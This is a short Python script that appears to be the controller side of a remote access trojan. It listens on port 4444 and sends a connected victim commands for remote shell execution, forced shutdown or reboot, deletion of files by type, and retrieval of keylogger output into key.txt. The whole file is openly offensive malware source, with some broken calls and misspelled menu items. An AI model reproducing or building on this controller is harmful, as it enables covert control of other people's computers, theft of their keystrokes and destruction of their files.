from socket import *

s = socket(2,1)
s.bind(("127.0.0.1",4444))
s.listen(1)
print("Connected To Port")
print("______________________________\n")


client, addr = s.accept()
print("Connected To"+str(addr)+"\n")
print("______________________________")


    
data = input('''
    1-CMD
    2-Restart or Reboot
    3-Delete File
    4-kilager 
    5-selenuiom  


            
Enter your choice:''')

if data == "1":
    client.send((data).encode())
    while True:
        Command = input("Enter Your Command: ")
        if Command.upper() == "F":
            break
        client.send((Command).encode())
        new_data = client.recv(102456).decode()
        print(new_data)

elif data == "2":
    p = input('''
        1-shutdown after  10S 
        2-Restart after  10S
        3-cancel

    Enter your choice:''')
    client.send(data,p.encode())


elif data == "3":
    F = open("Delete_File Result.txt", "w")
    p = input("Enter Your format File: ")
    client.send((data+p).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "4":
    F = open("key.txt", "w")
    client.send((data).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "5":
    client.send((data).encode())






    

        
        
        
    
    
    
